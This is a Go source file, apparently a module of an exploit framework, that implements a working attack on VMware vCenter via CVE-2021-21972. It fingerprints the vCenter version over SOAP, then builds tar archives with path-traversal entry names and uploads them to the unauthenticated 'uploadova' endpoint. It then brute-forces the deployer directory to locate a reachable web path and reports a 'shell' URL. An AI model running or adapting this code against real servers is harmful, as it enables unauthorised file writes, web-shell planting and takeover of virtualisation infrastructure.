package exp_vcenter

import (
	"archive/tar"
	"bytes"
	"fmt"
	"github.com/lz520520/railgunlib/pkg/goutils"
	"github.com/lz520520/railgunlib/pkg/register/exp_register"
	"github.com/lz520520/railgunlib/pkg/templates/exp_model"
	"github.com/lz520520/railgunlib/pkg/templates/exp_templates"
	"github.com/lz520520/railgunlib/pkg/utils/lznet/lzhttp"
	"regexp"
	"strconv"
	"strings"
	"time"
)

type Exp_CVE_2021_21972 struct {
	exp_templates.ExpTemplate
}

func (self *Exp_CVE_2021_21972) Attack_upload2() (expResult exp_model.ExpResult) {
	filename := self.MustGetStringParam("filename")
	content := self.MustGetStringParam("content")
	// 默认配置
	headers := self.GetInitExpHeaders()
	target := self.Params.BaseParam.Target
	if !strings.Contains(target, "uploadova") {
		target = strings.TrimRight(target, "/") + "/ui/vropspluginui/rest/services/uploadova"
	}
	resp := self.HttpGet(target, headers)
	if resp.Resp.StatusCode == 405 {
		self.EchoSuccessMsg("漏洞路径存在")
	} else {
		self.EchoErrMsg("漏洞路径不存在")
	}
	// 构造tar文件字节流
	b := &bytes.Buffer{}
	tw := tar.NewWriter(b)
	fakeTime, _ := time.Parse("2006-01-02 15:04:05", "2015-01-01 00:00:00")
	fih := tar.Header{
		Name:       filename,
		Size:       int64(len(content)),
		ModTime:    fakeTime,
		AccessTime: fakeTime,
		ChangeTime: fakeTime,
	}
	tw.WriteHeader(&fih)

	tw.Write([]byte(content))
	tw.Close()
	multiParts := []lzhttp.PostMultiPart{
		{
			FieldName:   "uploadFile",
			FileName:    "test.tar",
			ContentType: "",
			Content:     b.Bytes(),
		},
	}
	resp = self.HttpPostMulti(target, multiParts, headers)
	if resp.Err != nil {
		expResult.Err = resp.Err.Error()
		return
	}
	if strings.Contains(resp.Body, "SUCCESS") {
		expResult.Status = true
		self.EchoSuccessMsg("自行检查")
	}

	return
	//f, _ := os.Create("1.tar")
	//defer f.Close()

	/*	fi, err :=os.Stat(`D:\NonGreenNormalSoftware\SogouExplorer\搜狗高速下载\CVE-2021-21972-main\CVE-2021-21972-main\payload\Linux.tar`)
		if err != nil {
			return
		}

		hdr, err := tar.FileInfoHeader(fi, "")

		if err != nil {
			return
		}
		hdr.Name = "../../tmp/1.txt"*/

	//fmt.Println(fi)

}

func (self *Exp_CVE_2021_21972) Attack_upload1() (expResult exp_model.ExpResult) {
	filename := self.MustGetStringParam("filename")
	content := self.MustGetStringParam("content")
	// 默认配置
	headers := self.GetInitExpHeaders()
	target := self.Params.BaseParam.Target
	if !strings.Contains(target, "uploadova") {
		target = strings.TrimRight(target, "/") + "/ui/vropspluginui/rest/services/uploadova"
	}
	resp := self.HttpGet(target, headers)
	if resp.Err != nil {
		expResult.Err = resp.Err.Error()
		return
	}
	if resp.Resp.StatusCode == 405 {
		self.EchoSuccessMsg("漏洞路径存在")
	} else {
		self.EchoErrMsg("漏洞路径不存在")
		return
	}
	// ../../usr/lib/vmware-vsphere-ui/server/work/deployer/s/global/42/0/h5ngc.war/resources/test.jsp
	if filename == "findpath" {
		// 构造URI和资源路径
		tmpUri := "/resources/" + goutils.RandStr(0) + ".js"
		pathTemplate := "../../usr/lib/vmware-vsphere-ui/server/work/deployer/s/global/%s/0/h5ngc.war" + tmpUri

		tmpUrl := goutils.AppendUri(self.Params.BaseParam.Target, "/ui"+tmpUri)
		// 循环遍历
	over:
		for i := 0; i < 200; i++ {
			for {
				countStr := strconv.Itoa(i)
				tmpPath := strings.ReplaceAll(pathTemplate, "%s", countStr)
				tmpStatus, err := self.uploadTar(target, tmpPath, countStr, headers)
				// 这里主要是防止网络问题导致超时
				if err != nil {
					self.EchoErrMsg(err.Error() + ", sleep 1s...")
					time.Sleep(time.Second)
					continue
				}
				// 如果返回success则继续，否则表示漏洞不存在，无需继续
				if tmpStatus {
					self.EchoSuccessMsg(fmt.Sprintf("%v: 上传成功.", i))
					//time.Sleep(time.Millisecond * 1000)
					resp = self.HttpGet(tmpUrl, headers)
					if resp.Err != nil {
						self.EchoErrMsg(resp.Err.Error() + ", sleep 1s...")
						time.Sleep(time.Second)
						continue
					}
					// 路径正确
					time.Sleep(time.Millisecond * 100)
					if resp.Resp.StatusCode == 200 {
						self.EchoSuccessMsg("成功获取到可访问路径，如下：")
						self.EchoSuccessMsg(strings.ReplaceAll(pathTemplate, "%s", resp.Body))
						self.EchoSuccessMsg("shell: " + tmpUrl)
						expResult.Status = true
						break over
					}
				} else {
					break over
				}
				break
			}

		}
		return
	}

	tmpStatus, err := self.uploadTar(target, filename, content, headers)
	if err != nil {
		expResult.Err = err.Error()
		return
	}
	if tmpStatus {
		expResult.Status = true
		self.EchoSuccessMsg("自行检查")
	}
	return
	// 构造tar文件字节流
	/*	b := &bytes.Buffer{}
		tw := tar.NewWriter(b)
		fakeTime, _ := time.Parse("2006-01-02 15:04:05", "2015-01-01 00:00:00")
		fih := tar.Header{
			Name:       filename,
			Size:       int64(len(content)),
			ModTime:    fakeTime,
			AccessTime: fakeTime,
			ChangeTime: fakeTime,

		}
		tw.WriteHeader(&fih)

		tw.Write([]byte(content))
		tw.Close()

		resp = self.HttpPostMulti(target, "uploadFile", "test.tar", b.Bytes(), headers)
		if resp.Err != nil {
			respPath = resp.Err.Error()
			return
		}
		if strings.Contains(resp.Body, "SUCCESS") {
			status =true
			respPath = "自行检查"
		}

		return*/
	//f, _ := os.Create("1.tar")
	//defer f.Close()

	/*	fi, err :=os.Stat(`D:\NonGreenNormalSoftware\SogouExplorer\搜狗高速下载\CVE-2021-21972-main\CVE-2021-21972-main\payload\Linux.tar`)
		if err != nil {
			return
		}

		hdr, err := tar.FileInfoHeader(fi, "")

		if err != nil {
			return
		}
		hdr.Name = "../../tmp/1.txt"*/

	//fmt.Println(fi)

}

func (self *Exp_CVE_2021_21972) Attack_getmsg1() (expResult exp_model.ExpResult) {
	headers := self.GetInitExpHeaders()
	data := `<env:Envelope xmlns:xsd="http://www.w3.org/2001/XMLSchema" xmlns:env="http://schemas.xmlsoap.org/soap/envelope/" xmlns:xsi="http://www.w3.org/2001/XMLSchema-instance">
      <env:Body>
      <RetrieveServiceContent xmlns="urn:vim25">
        <_this type="ServiceInstance">ServiceInstance</_this>
      </RetrieveServiceContent>
      </env:Body>
      </env:Envelope>`
	resp := self.HttpPostWithoutRedirect(goutils.AppendUri(self.Params.BaseParam.Target, "/sdk"), data, headers)
	if resp.Err != nil {
		expResult.Err = resp.Err.Error()
		return
	}
	expResult.RawResult = resp.RawFullResp
	if !strings.Contains(self.getValue(resp.Body, "vendor"), "VMware") {
		expResult.Err = fmt.Sprintf("[-] Not a VMware system: " + self.Params.BaseParam.Target)
		return
	}
	version := self.getValue(resp.Body, "version")
	build := self.getValue(resp.Body, "build")
	full := self.getValue(resp.Body, "fullName")
	buildInt, _ := strconv.Atoi(build)
	if (regexp.MustCompile(`^6\.7`).MatchString(version) && buildInt > 13010631) ||
		regexp.MustCompile(`^7\.0`).MatchString(version) {
		expResult.Err = "vCenter 6.7U2+ running website in memory,so this exp can't work for 6.7 u2+"
	}
	expResult.Result = fmt.Sprintf("version: %s;\r\n[+] build: %s;\r\n[+] fullName: %s;", version, build, full)
	//self.EchoDetailMsg(self.ParserResult, resp.Body)
	return
}
func (self *Exp_CVE_2021_21972) uploadTar(target, filename, content string, headers lzhttp.Header) (status bool, err error) {
	status = false
	// 构造tar文件字节流
	b := &bytes.Buffer{}
	tw := tar.NewWriter(b)
	fakeTime, _ := time.Parse("2006-01-02 15:04:05", "2015-01-01 00:00:00")
	fih := tar.Header{
		Name:       filename,
		Size:       int64(len(content)),
		ModTime:    fakeTime,
		AccessTime: fakeTime,
		ChangeTime: fakeTime,
	}
	tw.WriteHeader(&fih)

	tw.Write([]byte(content))
	tw.Close()
	multiParts := []lzhttp.PostMultiPart{
		{
			FieldName:   "uploadFile",
			FileName:    "test.tar",
			ContentType: "",
			Content:     b.Bytes(),
		},
	}
	resp := self.HttpPostMulti(target, multiParts, headers)
	if resp.Err != nil {
		err = resp.Err
		return
	}
	if strings.Contains(resp.Body, "SUCCESS") {
		status = true
	}
	return

}

func (self *Exp_CVE_2021_21972) getValue(respStr, tag string) string {
	pattern := regexp.MustCompile(fmt.Sprintf(`<%s>(.*?)</%s>`, tag, tag))
	matchSlice := pattern.FindStringSubmatch(respStr)
	result := ""
	if len(matchSlice) > 1 {
		result = matchSlice[1]
	}

	return strings.TrimSpace(result)
}
func init() {
	exp_register.ExpStructRegister(&Exp_CVE_2021_21972{}, "exp_CVE_2021_21972.yml")
}
